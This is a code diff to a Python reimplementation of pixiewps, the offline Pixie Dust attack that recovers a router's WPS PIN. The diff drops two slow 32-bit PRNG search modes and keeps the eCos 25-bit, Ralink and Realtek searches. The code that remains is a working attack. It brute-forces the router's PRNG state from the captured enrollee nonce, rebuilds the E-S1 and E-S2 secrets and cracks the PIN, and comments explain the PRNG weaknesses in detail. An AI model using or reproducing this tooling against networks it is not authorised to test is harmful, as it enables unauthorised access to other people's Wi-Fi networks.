@@ -10,8 +10,10 @@ Mode priority (higher confidence first):
   ECOS — glibc LCG used in eCos (25-bit search space)
   RTL  — Realtek RTL819x (Park-Miller, time-seeded; search ±MODE3_TRIES seconds)
 
-ECOS_SIMPLEST and ECOS_KNUTH (pixiewps modes 4/5) are included but those are
-marked "Not tested" by the reference authors — kept for completeness.
+ECOS_SIMPLEST and ECOS_KNUTH (pixiewps modes 4/5) are NOT implemented:
+they need a full 2^32 PRNG-state search, which pixiewps does in C but is
+days-to-weeks in pure Python -- a fallback that can never finish is worse
+than none (it would look like a hang). Dropped 2026-09-14.
 """
 
 from __future__ import annotations
@@ -84,23 +86,6 @@ def _ecos_simple(seed: int) -> tuple[int, int]:
     s = (s * 1103515245 + 12345) & MASK
     uret += (s & 0xFE000000) >> 25
     return (uret & 0xFF), s
-
-
-def _ecos_simplest(seed: int) -> tuple[int, int]:
-    seed = (seed * 1103515245 + 12345) & 0xFFFFFFFF
-    return seed & 0xFF, seed
-
-
-def _ecos_knuth(seed: int) -> tuple[int, int]:
-    MM = 0x7FFFFFFF
-    AA = 48271
-    QQ = 44488
-    RR = 3399
-    seed = AA * (seed % QQ) - RR * (seed // QQ)
-    if seed & 0x80000000:
-        seed += MM
-    seed &= 0xFFFFFFFF
-    return seed & 0xFF, seed
 
 
 _PARK_MILLER_A = 16807
@@ -259,70 +244,47 @@ def _try_rt(e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
 
 
 def _try_ecos(prng_fn, e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
-              e_hash1: bytes, e_hash2: bytes, search_bits: int = 32) -> str | None:
-    """Generic ECOS search: seed produces E-Nonce then E-S1 then E-S2.
+              e_hash1: bytes, e_hash2: bytes, search_bits: int = 25) -> str | None:
+    """ECOS_SIMPLE search (search_bits=25): seed produces E-Nonce then
+    E-S1 then E-S2.
 
-    For ECOS_SIMPLE (search_bits=25):
-      The PRNG state *after* the first call (which produced nonce[0]) has its
-      top 7 bits equal to nonce[0]'s bottom 7 bits (because ecos_rand_simple
-      puts s3's top 7 bits into the return value's bottom 7 bits, and s3 is
-      the updated state). So we search states where `state >> 25 = nonce[0] & 0x7F`
-      and verify nonce[1..15] from that state — matching pixiewps exactly.
+    The PRNG state *after* the first call (which produced nonce[0]) has its
+    top 7 bits equal to nonce[0]'s bottom 7 bits (because ecos_rand_simple
+    puts s3's top 7 bits into the return value's bottom 7 bits, and s3 is
+    the updated state). So we search states where `state >> 25 = nonce[0] & 0x7F`
+    and verify nonce[1..15] from that state — matching pixiewps exactly.
 
-    For ECOS_SIMPLEST / ECOS_KNUTH (search_bits=32): full search, state produces
-      all 16 nonce bytes directly (PRNG output = state directly for SIMPLEST).
+    Only the 25-bit variant exists: the 32-bit ECOS modes (SIMPLEST/KNUTH)
+    are a days-long search in pure Python -- dropped, see module docstring.
     """
     MASK = 0xFFFFFFFF
-    if search_bits < 32:
-        # known: top 7 bits of the post-first-call state come from nonce[0] & 0x7F
-        # (ecos_rand_simple only: s3 >> 25 == output & 0x7F)
-        known = (e_nonce[0] & 0x7F) << 25  # matches C: e_nonce[0] << 25 (7 sig bits)
-        total = 1 << search_bits  # 2^25
-        for counter in range(total):
-            # seed here is the post-first-call state (S'), not the original seed
-            seed = (known | counter) & MASK
-            s = seed
-            match = True
-            for i in range(1, _NONCE_LEN):  # nonce[0] already consumed
-                b, s = prng_fn(s)
-                if b != e_nonce[i]:
-                    match = False
-                    break
-            if match:
-                es1 = bytearray(_NONCE_LEN)
-                for i in range(_NONCE_LEN):
-                    b, s = prng_fn(s)
-                    es1[i] = b
-                es2 = bytearray(_NONCE_LEN)
-                for i in range(_NONCE_LEN):
-                    b, s = prng_fn(s)
-                    es2[i] = b
-                pin = crack_pin_from_secrets(auth_key, bytes(es1), bytes(es2),
-                                             pke, pkr, e_hash1, e_hash2)
-                if pin is not None:
-                    return pin
-    else:
-        for seed in range(0x100000000):
-            s = seed
-            match = True
+    # known: top 7 bits of the post-first-call state come from nonce[0] & 0x7F
+    # (ecos_rand_simple only: s3 >> 25 == output & 0x7F)
+    known = (e_nonce[0] & 0x7F) << 25  # matches C: e_nonce[0] << 25 (7 sig bits)
+    total = 1 << search_bits  # 2^25
+    for counter in range(total):
+        # seed here is the post-first-call state (S'), not the original seed
+        seed = (known | counter) & MASK
+        s = seed
+        match = True
+        for i in range(1, _NONCE_LEN):  # nonce[0] already consumed
+            b, s = prng_fn(s)
+            if b != e_nonce[i]:
+                match = False
+                break
+        if match:
+            es1 = bytearray(_NONCE_LEN)
             for i in range(_NONCE_LEN):
                 b, s = prng_fn(s)
-                if b != e_nonce[i]:
-                    match = False
-                    break
-            if match:
-                es1 = bytearray(_NONCE_LEN)
-                for i in range(_NONCE_LEN):
-                    b, s = prng_fn(s)
-                    es1[i] = b
-                es2 = bytearray(_NONCE_LEN)
-                for i in range(_NONCE_LEN):
-                    b, s = prng_fn(s)
-                    es2[i] = b
-                pin = crack_pin_from_secrets(auth_key, bytes(es1), bytes(es2),
-                                             pke, pkr, e_hash1, e_hash2)
-                if pin is not None:
-                    return pin
+                es1[i] = b
+            es2 = bytearray(_NONCE_LEN)
+            for i in range(_NONCE_LEN):
+                b, s = prng_fn(s)
+                es2[i] = b
+            pin = crack_pin_from_secrets(auth_key, bytes(es1), bytes(es2),
+                                         pke, pkr, e_hash1, e_hash2)
+            if pin is not None:
+                return pin
     return None
 
 
@@ -374,7 +336,7 @@ def _try_rtl(e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
 @dataclass
 class PixieResult:
     pin: str | None
-    mode: str | None    # "RT", "ECOS_SIMPLE", "RTL819x", "ECOS_SIMPLEST", "ECOS_KNUTH"
+    mode: str | None    # "RT", "ECOS_SIMPLE", or "RTL819x"
 
 
 def pixie_dust(
@@ -416,16 +378,6 @@ def pixie_dust(
     if pin is not None:
         return PixieResult(pin=pin, mode="RTL819x")
 
-    # ECOS_SIMPLEST — full 32-bit, slow; marked "Not tested" by authors
-    pin = _try_ecos(_ecos_simplest, e_nonce, auth_key, pke, pkr,
-                    e_hash1, e_hash2, search_bits=32)
-    if pin is not None:
-        return PixieResult(pin=pin, mode="ECOS_SIMPLEST")
-
-    # ECOS_KNUTH — full 32-bit, slow; marked "Not tested" by authors
-    pin = _try_ecos(_ecos_knuth, e_nonce, auth_key, pke, pkr,
-                    e_hash1, e_hash2, search_bits=32)
-    if pin is not None:
-        return PixieResult(pin=pin, mode="ECOS_KNUTH")
-
+    # ECOS_SIMPLEST / ECOS_KNUTH deliberately not attempted -- see the
+    # module docstring (2^32 pure-Python search can never finish).
     return PixieResult(pin=None, mode=None)
